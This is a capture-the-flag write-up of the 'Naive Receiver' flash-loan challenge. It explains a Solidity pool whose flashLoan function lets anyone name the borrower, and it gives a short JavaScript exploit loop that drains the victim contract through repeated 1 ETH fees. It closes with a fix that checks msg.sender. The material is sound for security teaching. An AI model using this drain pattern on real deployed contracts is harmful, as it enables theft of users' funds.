# Naive-Receiver

## Introduction
The goal is to drain the user tokens.
In this section, flash loan from ***NaiveReceiverLenderPool.sol*** impose a fixed interest rate of 1 ether (Holy jesus)
Therefore, 1 token will be extracted from the user for every flash loan.

## Code Breakdown
Let's start by breaking down the source code into functions.
There are two files - ***FlashLoanReceiver.sol*** and ***NaiveReceiverLenderPool.sol***.
Similiar to the previous challenge, ***NaiveReceiverLenderPool.sol*** will execute function from ***FlashLoanReceiver.sol*** during a flashloan.

Let's look at ***NaiveReceiverLenderPool.sol*** primarily.
Two types of variables are declared at the start - ***Address*** and ***FIXED_FEE***.
```
using Address for address;
uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
```

The primary function of the smart contract have several items to look at
```
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {

    //goal to drain user's contract funds

    uint256 balanceBefore = address(this).balance; 
    require(balanceBefore >= borrowAmount, "Not enough ETH in pool"); 

    require(borrower.isContract(), "Borrower must be a deployed contract"); //can only be called from a different contract
    // Transfer ETH and handle control to receiver
    borrower.functionCallWithValue(
        abi.encodeWithSignature(
            "receiveEther(uint256)",
            FIXED_FEE
        ),
        borrowAmount
    );
    
    require(
        address(this).balance >= balanceBefore + FIXED_FEE,
        "Flash loan hasn't been paid back"
    );
}
```

Unlike the previous challenge, only 1 pool exist now.
***balanceBefore*** is a variable that stores the current number of ethers in the pool prior to a flash loan.
It must be more or equal to ***borrowAmount***.
```require(balanceBefore >= borrowAmount, "Not enough ETH in pool");``` 

Next, borrower must be a deployed contract rather than a user.
```require(borrower.isContract(), "Borrower must be a deployed contract");```

Next, it will execute ***receiverEther(uint256)*** function from ***FlashLoanReceiver.sol***.
```sol
// Transfer ETH and handle control to receiver
borrower.functionCallWithValue(
    abi.encodeWithSignature(
        "receiveEther(uint256)",
        FIXED_FEE
    ),
    borrowAmount
);
```

After executing the function from ***FlashLoanReceiver.sol***, it will check if the borrowed amount is payed along with the fixed fee.
```sol
require(
    address(this).balance >= balanceBefore + FIXED_FEE,
    "Flash loan hasn't been paid back"
);
```

## Hint
This function does not check if the ***msg.sender*** is indeed the borrower.
```sol
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant
```
Thus, an attacker can insert any valid address and initiate a flash loan causing the victim to pay the fixed fee.

## Solution
The solution is to siphon tokens away from a legitimate user by putting in their address for a flash loan.
By doing so, the smart contract will charge the legitimate user a fixed fee of 1 ETH per flash loan till they run out.
This is the easy solution.
```js
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */   
    while (true){
        await this.pool.flashLoan(this.receiver.address, 0);
        value = String(await ethers.provider.getBalance(this.receiver.address));
        console.log(value);
        if (value == "0"){
            break;
        }
    }
});
```

## Recommendations
Always check if the sender is the borrower. A simple require statement can be implemented at the start of the flash loan
```require(msg.sender == borrower);```